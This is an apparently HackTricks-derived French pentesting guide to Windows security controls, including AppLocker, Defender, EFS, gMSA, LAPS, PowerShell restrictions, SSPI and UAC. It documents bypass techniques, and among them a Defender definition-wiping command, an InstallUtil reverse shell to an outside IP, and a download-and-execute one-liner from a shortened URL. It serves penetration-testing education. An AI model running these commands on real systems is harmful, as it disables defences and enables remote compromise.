# Contrôles de sécurité Windows

{{#include ../../banners/hacktricks-training.md}}

## Politique AppLocker

Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nuisibles et les logiciels non approuvés qui ne correspondent pas aux besoins commerciaux spécifiques d'une organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **quelles applications et fichiers les utilisateurs peuvent exécuter**. Il fournit un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérifier

Vérifiez quels fichiers/extensions sont sur liste noire/liste blanche :
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ce chemin de registre contient les configurations et les politiques appliquées par AppLocker, fournissant un moyen de revoir l'ensemble actuel des règles appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Contournement

- Dossiers **écrits** utiles pour contourner la politique AppLocker : Si AppLocker permet d'exécuter quoi que ce soit à l'intérieur de `C:\Windows\System32` ou `C:\Windows`, il existe des **dossiers écrits** que vous pouvez utiliser pour **contourner cela**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Les binaires **"LOLBAS"** [**de confiance**](https://lolbas-project.github.io/) peuvent également être utiles pour contourner AppLocker.
- **Des règles mal écrites peuvent également être contournées**
- Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
- Les organisations se concentrent souvent sur **le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements d'exécutables PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **L'application des DLL est très rarement activée** en raison de la charge supplémentaire qu'elle peut imposer à un système, et de la quantité de tests nécessaires pour s'assurer que rien ne se casse. Donc, utiliser **des DLL comme portes dérobées aidera à contourner AppLocker**.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Stockage des identifiants

### Gestionnaire de comptes de sécurité (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe sont hachés.

### Autorité de sécurité locale (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour des raisons de Single Sign-On.\
**LSA** administre la **politique de sécurité** locale (politique de mot de passe, permissions des utilisateurs...), **authentification**, **jetons d'accès**...\
LSA sera celui qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **identifiants** sont **enregistrés** dans le **processus LSASS** : tickets Kerberos, hachages NT et LM, mots de passe facilement déchiffrés.

### Secrets LSA

LSA pourrait enregistrer sur disque certains identifiants :

- Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes de services Windows
- Mots de passe pour les tâches planifiées
- Plus (mot de passe des applications IIS...)

### NTDS.dit

C'est la base de données de l'Active Directory. Elle est uniquement présente dans les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** des outils de pentesting courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier le **statut** de **Defender**, vous pouvez exécuter la commande PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir si elle est active) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l'énumérer, vous pourriez également exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Système de fichiers chiffré (EFS)

EFS sécurise les fichiers par le biais du chiffrement, utilisant une **clé symétrique** connue sous le nom de **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le $EFS **flux de données alternatif** du fichier chiffré. Lorsque le déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer le FEK à partir du flux $EFS. Plus de détails peuvent être trouvés [ici](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scénarios de déchiffrement sans initiation de l'utilisateur** incluent :

- Lorsque des fichiers ou des dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant la transmission.

Cette méthode de chiffrement permet un **accès transparent** aux fichiers chiffrés pour le propriétaire. Cependant, changer simplement le mot de passe du propriétaire et se connecter ne permettra pas le déchiffrement.

**Points clés** :

- EFS utilise un FEK symétrique, chiffré avec la clé publique de l'utilisateur.
- Le déchiffrement utilise la clé privée de l'utilisateur pour accéder au FEK.
- Le déchiffrement automatique se produit dans des conditions spécifiques, comme la copie vers FAT32 ou la transmission sur le réseau.
- Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.

### Vérifier les informations EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier en utilisant cipher /c \<file>\
Vous pouvez également utiliser `cipher /e` et `cipher /d` dans un dossier pour **chiffrer** et **déchiffrer** tous les fichiers

### Déchiffrement des fichiers EFS

#### Être Autorité Système

Cette méthode nécessite que l'**utilisateur victime** soit **en train d'exécuter** un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez usurper le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pourriez simplement `migrer` vers le processus de l'utilisateur.

#### Connaître le mot de passe de l'utilisateur

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Comptes de service gérés par groupe (gMSA)

Microsoft a développé les **Comptes de service gérés par groupe (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures informatiques. Contrairement aux comptes de service traditionnels qui ont souvent le paramètre "**Le mot de passe n'expire jamais**" activé, les gMSA offrent une solution plus sécurisée et gérable :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères qui change automatiquement selon la politique de domaine ou d'ordinateur. Ce processus est géré par le Service de distribution de clés (KDC) de Microsoft, éliminant le besoin de mises à jour manuelles des mots de passe.
- **Sécurité renforcée** : ces comptes sont immunisés contre les verrouillages et ne peuvent pas être utilisés pour des connexions interactives, renforçant leur sécurité.
- **Support multi-hôte** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services fonctionnant sur plusieurs serveurs.
- **Capacité de tâche planifiée** : contrairement aux comptes de service gérés, les gMSA prennent en charge l'exécution de tâches planifiées.
- **Gestion simplifiée des SPN** : le système met automatiquement à jour le nom principal de service (SPN) lorsqu'il y a des changements dans les détails du sAMaccount de l'ordinateur ou le nom DNS, simplifiant la gestion des SPN.

Les mots de passe pour les gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les contrôleurs de domaine (DC). Ce mot de passe, un blob de données chiffrées connu sous le nom de [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par des administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant un environnement sécurisé. Pour accéder à ces informations, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trouvez plus d'infos dans ce post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Aussi, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) sur comment effectuer une **attaque de relais NTLM** pour **lire** le **mot de passe** de **gMSA**.

## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe des administrateurs locaux. Ces mots de passe, qui sont **randomisés**, uniques et **régulièrement changés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la possibilité de lire les mots de passe des administrateurs locaux est fournie.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, comme le blocage des objets COM, n'autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.

### **Vérifiez**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contournement
```powershell
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows, ce contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez** **_Ajouter une Référence_** -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet en .Net4.5**.

#### Contournement direct :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner le mode restreint. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politique d'exécution PS

Par défaut, elle est définie sur **restricted.** Principales façons de contourner cette politique :
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Plus d'informations peuvent être trouvées [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface de fournisseur de support de sécurité (SSPI)

C'est l'API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera quel protocole d'authentification sera utilisé, ces protocoles d'authentification sont appelés Fournisseur de support de sécurité (SSP), se trouvent à l'intérieur de chaque machine Windows sous la forme d'un DLL et les deux machines doivent prendre en charge le même pour pouvoir communiquer.

### Principaux SSPs

- **Kerberos** : Le préféré
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** et **NTLMv2** : Raisons de compatibilité
- %windir%\Windows\System32\msv1_0.dll
- **Digest** : Serveurs web et LDAP, mot de passe sous forme de hachage MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel** : SSL et TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM étant Kerberos le protocole par défaut)
- %windir%\Windows\System32\lsasrv.dll

#### La négociation pourrait offrir plusieurs méthodes ou seulement une.

## UAC - Contrôle de compte d'utilisateur

[Le contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **invite de consentement pour des activités élevées**.

{{#ref}}
uac-user-account-control.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
